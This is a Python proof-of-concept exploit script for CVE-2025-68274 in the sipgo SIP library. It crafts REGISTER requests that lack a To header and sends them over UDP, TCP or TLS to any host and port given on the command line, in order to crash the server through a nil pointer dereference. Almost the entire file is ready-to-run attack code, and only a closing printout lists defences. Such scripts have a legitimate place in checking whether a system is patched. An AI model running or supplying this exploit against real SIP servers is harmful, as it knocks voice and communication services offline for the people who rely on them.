#!/usr/bin/env python3
"""
sipgo Response DoS Exploit (CVE-2025-68274)

This script exploits a nil pointer dereference vulnerability in the SipGo library's
NewResponseFromRequest function by sending REGISTER requests without To headers.

Vulnerability Details:
- CVE: CVE-2025-68274
- GHSA: GHSA-c623-f998-8hhv
- Affects sipgo versions >= v0.3.0, < v1.0.0-alpha-1
- Triggers on missing To header in SIP requests
- Causes immediate crash with SIGSEGV
- No authentication required

Usage:
    python3 sipgo-response-dos.py <target_ip> <target_port> [protocol]
    
    protocol: udp (default), tcp, or tls
    
Examples:
    python3 sipgo-response-dos.py 127.0.0.1 5060
    python3 sipgo-response-dos.py 192.168.1.100 5060 tcp
    python3 sipgo-response-dos.py sipserver.example.com 5061 tls
"""

import socket
import ssl
import sys
import time
import random
import os

def create_malformed_register(target_ip, target_port, source_ip="192.168.1.100", source_port=5060):
    """
    Creates a malformed REGISTER request without To header.
    This triggers the nil pointer dereference in sipgo's NewResponseFromRequest.
    """
    
    # Generate unique identifiers to track this specific attack
    call_id = f"sipgo-dos-{int(time.time())}"
    tag = f"sipgo-dos-{random.randint(1000, 9999)}"
    branch = f"z9hG4bK-sipgo-dos-{random.randint(10000, 99999)}"
    
    # Craft the malformed SIP REGISTER request
    # KEY VULNERABILITY: Missing To header causes nil pointer dereference
    sip_message = (
        f"REGISTER sip:{target_ip}:{target_port} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {source_ip}:{source_port};rport;branch={branch}\r\n"
        f"From: <sip:attacker@{source_ip}>;tag={tag}\r\n"
        f"Call-ID: {call_id}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:attacker@{source_ip}:{source_port}>\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    )
    
    return sip_message

def send_udp_exploit(target_ip, target_port):
    """Send exploit via UDP"""
    print(f"[*] Targeting {target_ip}:{target_port} via UDP")
    
    try:
        # Create UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5.0)
        
        # Generate malformed REGISTER request
        payload = create_malformed_register(target_ip, target_port)
        
        print("[*] Sending malformed REGISTER request (missing To header)...")
        print(f"[*] Payload size: {len(payload)} bytes")
        
        # Send the exploit
        sock.sendto(payload.encode('utf-8'), (target_ip, target_port))
        
        # Try to receive response (likely won't get one due to crash)
        try:
            response, addr = sock.recvfrom(4096)
            print(f"[!] Unexpected response received: {response[:200]}...")
            print("[!] Target may be patched or using different library")
        except socket.timeout:
            print("[+] No response received - target likely crashed!")
            print("[+] sipgo Response DoS exploit successful")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] UDP exploit failed: {e}")

def send_tcp_exploit(target_ip, target_port):
    """Send exploit via TCP"""
    print(f"[*] Targeting {target_ip}:{target_port} via TCP")
    
    try:
        # Create TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10.0)
        
        print(f"[*] Connecting to {target_ip}:{target_port}...")
        sock.connect((target_ip, target_port))
        
        # Generate malformed REGISTER request
        payload = create_malformed_register(target_ip, target_port)
        
        print("[*] Sending malformed REGISTER request (missing To header)...")
        print(f"[*] Payload size: {len(payload)} bytes")
        
        # Send the exploit
        sock.send(payload.encode('utf-8'))
        
        # Try to receive response
        try:
            response = sock.recv(4096)
            if response:
                print(f"[!] Unexpected response received: {response[:200]}...")
                print("[!] Target may be patched or using different library")
            else:
                print("[+] Connection closed by target - likely crashed!")
                print("[+] sipgo Response DoS exploit successful")
        except socket.timeout:
            print("[+] No response received - target likely crashed!")
            print("[+] sipgo Response DoS exploit successful")
        
        sock.close()
        
    except ConnectionRefusedError:
        print("[-] Connection refused - target may be down or port closed")
    except Exception as e:
        print(f"[-] TCP exploit failed: {e}")

def send_tls_exploit(target_ip, target_port):
    """Send exploit via TLS"""
    print(f"[*] Targeting {target_ip}:{target_port} via TLS")
    
    try:
        # Create TLS context
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # Enable TLS key logging for Wireshark if environment variable is set
        if 'SSLKEYLOGFILE' in os.environ:
            context.keylog_filename = os.environ['SSLKEYLOGFILE']
            print(f"[*] TLS key logging enabled: {context.keylog_filename}")
        
        # Create socket and wrap with TLS
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15.0)
        
        print(f"[*] Establishing TLS connection to {target_ip}:{target_port}...")
        tls_sock = context.wrap_socket(sock, server_hostname=target_ip)
        tls_sock.connect((target_ip, target_port))
        
        print(f"[+] TLS connection established")
        print(f"[*] TLS version: {tls_sock.version()}")
        
        # Generate malformed REGISTER request
        payload = create_malformed_register(target_ip, target_port)
        
        print("[*] Sending malformed REGISTER request (missing To header)...")
        print(f"[*] Payload size: {len(payload)} bytes")
        
        # Send the exploit
        tls_sock.send(payload.encode('utf-8'))
        
        # Try to receive response
        try:
            response = tls_sock.recv(4096)
            if response:
                print(f"[!] Unexpected response received: {response[:200]}...")
                print("[!] Target may be patched or using different library")
            else:
                print("[+] TLS connection closed by target - likely crashed!")
                print("[+] sipgo Response DoS exploit successful")
        except socket.timeout:
            print("[+] No response received - target likely crashed!")
            print("[+] sipgo Response DoS exploit successful")
        
        tls_sock.close()
        
    except ssl.SSLError as e:
        print(f"[-] TLS error: {e}")
    except ConnectionRefusedError:
        print("[-] Connection refused - target may be down or port closed")
    except Exception as e:
        print(f"[-] TLS exploit failed: {e}")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 sipgo-response-dos.py <target_ip> <target_port> [protocol]")
        print()
        print("Protocol options:")
        print("  udp  - UDP transport (default)")
        print("  tcp  - TCP transport")
        print("  tls  - TLS transport")
        print()
        print("Examples:")
        print("  python3 sipgo-response-dos.py 127.0.0.1 5060")
        print("  python3 sipgo-response-dos.py 192.168.1.100 5060 tcp")
        print("  python3 sipgo-response-dos.py sipserver.example.com 5061 tls")
        print()
        print("For TLS key logging (Wireshark decryption):")
        print("  export SSLKEYLOGFILE=/tmp/sslkeys.log")
        print("  python3 sipgo-response-dos.py target 5061 tls")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    protocol = sys.argv[3].lower() if len(sys.argv) > 3 else 'udp'
    
    if protocol not in ['udp', 'tcp', 'tls']:
        print("[-] Invalid protocol. Use: udp, tcp, or tls")
        sys.exit(1)
    
    print("=" * 60)
    print("    sipgo Response DoS Exploit (CVE-2025-68274)")
    print("=" * 60)
    print()
    print("Vulnerability: Nil pointer dereference in NewResponseFromRequest")
    print("Trigger: REGISTER request without To header")
    print("Impact: Immediate application crash (SIGSEGV)")
    print()
    print(f"Target: {target_ip}:{target_port}")
    print(f"Protocol: {protocol.upper()}")
    print()
    
    # Execute exploit based on protocol
    if protocol == 'udp':
        send_udp_exploit(target_ip, target_port)
    elif protocol == 'tcp':
        send_tcp_exploit(target_ip, target_port)
    elif protocol == 'tls':
        send_tls_exploit(target_ip, target_port)
    
    print()
    print("=" * 60)
    print("Exploit completed.")
    print()
    print("If the target crashed:")
    print("- Check target application logs for SIGSEGV")
    print("- Stack trace should show panic in NewResponseFromRequest")
    print("- Restart the target application to restore service")
    print()
    print("Defense:")
    print("- Update sipgo library to patched version")
    print("- Add input validation for required SIP headers")
    print("- Implement nil pointer checks in response handling")

if __name__ == "__main__":
    main()